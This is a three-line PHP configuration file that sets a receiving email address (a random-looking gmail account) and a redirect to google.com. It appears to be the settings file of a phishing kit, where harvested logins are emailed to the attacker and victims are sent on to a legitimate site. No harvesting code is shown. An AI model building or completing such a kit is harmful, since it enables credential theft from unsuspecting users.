<?php 
$Receive_email="r3KAAQjkVqbFW22@gmail.com";
$redirect="https://www.google.com/";
?>